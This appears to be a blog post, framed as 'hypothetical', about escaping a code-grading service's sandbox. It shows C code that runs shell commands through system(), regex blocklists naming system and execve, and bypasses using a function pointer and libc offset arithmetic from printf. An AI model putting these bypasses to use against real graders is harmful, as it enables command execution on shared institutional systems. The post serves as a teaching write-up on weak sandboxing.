---
layout: post
title: leaking test cases from gradescope
date: 2026-10-24 05:40:00 +0800
---

recommended listening for this post is [duran duran's come undone](https://www.youtube.com/watch?v=Epj84QVw2rc)
![kikuo](/assets/kikuo.png)

alright lets say entirely hypothetically purely theoretically speaking that you are a student in a university with a certain module that requires u to submit samples of code. these samples of code get compiled and tested against expected inputs / outputs.

for an entirely educational wholly hypothetical Not Real scenario such as this perhaps it would be elucidatory to some extent to test the limits of this entirely hypothetical system. the service _is_ just running and compiling code, right? this seems like a fun, easy, largely trivial target for pentesting, and importantly, since this service is Not Real and Super Fake, no real damage would be done.

(nota bene: of course if this service was real i would trust that they are smart enough to properly containerize and sandbox everything such that compromising a single 'grader' machine would not compromise their entire network - indeed this is true because this hypothetical company isnt completely fucking stupid and therefore no real damage can be from these exploratory Funny Funny actions)

of course, naturally, the hypothetical faculty in charge of this module would want to sandbox and prevent this exploratory behaviour in some way - it is only natural. so, let's actually go through, step by step, some levels of sandboxing and how bypassable those sandboxes are. the goal, as always, is to demonstrate the capability of popping a shell.

### the fake not real environment

so i ""created"" (asked chatgpt to make, because i am tired and lazy) a fake environment to set this up. codeslop will be on my github.

![rawr](/assets/gradescope-fake.png)

it's just a flask app that we can easily modify and add protections to later, it works for now! yay

### stage 1: no protections at all

of course if there are no protections, we can just call `system()` :

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void) {
    system("ls -alps");
    return 0;
}
```

obviously, this trivially works:

```bash
total 28
 4 drwxrwxrwx 1 root root  4096 Nov 14 06:33 ./
 4 drwxr-xr-x 1 root root  4096 Nov 14 06:26 ../
16 -rwxr-xr-x 1 root root 15952 Nov 14 06:33 a.out
 4 -rw-r--r-- 1 root root   123 Nov 14 06:33 code.c
```

i'm not gonna talk more about this i think it's self explanatory

### stage 2: regex detection

this is once again a _really_ rudimentary sandboxing technique (it can hardly be called a technique imo). we just define a list of function calls that we don't want people calling, and scan the source code.

```python
def regex_protection(code: str):
    import re

    function_calls = [
        r'system\(.*\)',
        r'execve\(.*\)',
    ]

    for i in function_calls:
        reg = re.compile(i)
        for match in re.findall(reg, code):
            if match is not None: return False

    return True
```

we can verify that our original payload would fail this check >

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void) {
    system("ls -alps");
    return 0;
}
```

```bash
Output
failed the regex check
```

kena...

anyways so the bypass for this is simple: we want to somehow 'call' `system` still, so what we can do is create a new empty function object, assign it the ptr to `system`, and then call that function object.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void) {
  int (*rawr)(const char *command);
  const char *cmd = "ls -alps";
  rawr = &system;
  rawr(cmd);
  return 0;
}
```

we can verify that this works.

### stage 3: harder regex

what if we just blacklist every instance of the word `system`?

```python
def regex_protection(code: str):
    import re

    function_calls = [
        r'system',
        r'execve',
    ]

    for i in function_calls:
        reg = re.compile(i)
        for match in re.findall(reg, code):
            print(code, match)
            if match is not None: return False

    return True
```

we can no longer call `system()` directly. how now?

background: for a program that is dynamically linked, functions like `printf` and `system` are not defined in the binary, they're defined in a separate address space for the library `libc.so.6` to run in. given that `libc.so.6` is compiled with PIE (position independent executable), this means that the positions of the functions in memory are randomized every single time we run the function.

to draw an analogy: think of the pointers in `libc` like the cars on a train on a long piece of track. the cars are always in the same order, but we don't know how far along the track the train is, therefore we don't know where specific cars are, by extension.in the past, we could directly get a reference to the train car, but now we cannot.

what we can do, however, is get positions of _adjacent_ or _nearby_ cars on the train, and then add or subtract a certain offset. given that the cars are always in the same order, the offsets to and from individual cars will also always be in the same order. as long as we know where one car is, we know where every car is, because every car's position is "constant" relative to other cars.

but this implies we, of course, know the 'order' of the cars on the train. how do we do that?

```c
int main(int argc, char *argv[]){

    FILE *f = fopen("/usr/lib/x86_64-linux-gnu/libc.so.6","rb");
    if(!f){ perror("fopen"); return 1; }

    MD5_CTX ctx;
    md5_init(&ctx);

    uint8_t buf[32768];
    size_t n;
    while((n=fread(buf,1,sizeof(buf),f))>0)
        md5_update(&ctx, buf, n);

    uint8_t hash[16];
    md5_final(&ctx, hash);

    for(int i=0;i<16;i++)
        printf("%02x", hash[i]);
    printf("\n");

    fclose(f);
    return 0;
}
```

we get the md5 hash of `libc`, and query an online database.

```bash
navi@curette (s/code-src/eh/scratchwork) > curl -X POST -H 'Content-Type: application/json' --data \
     '{"md5": "f0558b66ef3f614703cc30497c48ec42"}' \
     'https://libc.rip/api/find' | jq
```

which gives us:

```python
[
  {
    "buildid": "def5460e3cee00bfee25b429c97bcc4853e5b3a8",
    "download_url": "https://libc.rip/download/libc6_2.41-12_amd64.so",
    "id": "libc6_2.41-12_amd64",
    "libs_url": "https://deb.debian.org/debian/pool/main/g/glibc//libc6_2.41-12_amd64.deb",
    "md5": "f688b13e6d1f5845fd77eae4cf2cd040",
    "sha1": "1582e6da2d33fbdab9c244763217a7ff479a65c7",
    "sha256": "56e42210fbaee005355b622121fec8b0c16ca80837eddce3e3557075103dda78",
    "symbols": {
      "__libc_start_main_ret": "0x29ca8",
      "dup2": "0xff860",
      "printf": "0x59900",
      "puts": "0x805a0",
      "read": "0x103e90",
      "str_bin_sh": "0x1a7ea4",
      "system": "0x53110",
      "write": "0x104920"
    },
    "symbols_url": "https://libc.rip/download/libc6_2.41-12_amd64.symbols"
  }
]
```


so now, we have a bunch of offsets to very useful stuff. what we can now do is get a pointer to `printf` (which isn't blacklisted), increment (or in this case, decrement) it by the relative offset to `system`, and then call it.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

int main(void) {
  const char *command = "ls -alps";
  uint64_t ptr = (uint64_t)&printf - 0x59900 + 0x53110;
  int (*rawr)(const char *command) = (int (*)(const char *)) ptr;
  rawr(command);
  return 0;
  }
```

### stage 4: execution level

when the entirely hypothetical faculty in charge of this entirely hypothetical service keeps up with me i will update this post xoxo


